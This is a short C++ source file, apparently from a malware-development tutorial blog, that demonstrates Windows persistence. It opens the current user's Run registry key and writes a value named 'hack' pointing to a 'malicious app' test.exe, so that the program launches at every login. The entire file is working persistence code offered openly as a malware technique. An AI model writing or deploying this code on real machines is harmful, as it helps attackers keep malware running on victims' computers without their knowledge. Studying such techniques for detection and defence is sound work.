/*
pers.cpp
windows low level persistense via start folder registry key
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html
*/
#include <windows.h>
#include <string.h>
#include <filesystem>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious app
  std::string current_File = std::filesystem::current_path().string() + "\\test.exe";
  const char* exe = current_File.c_str();

  // startup
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }
  return 0;
}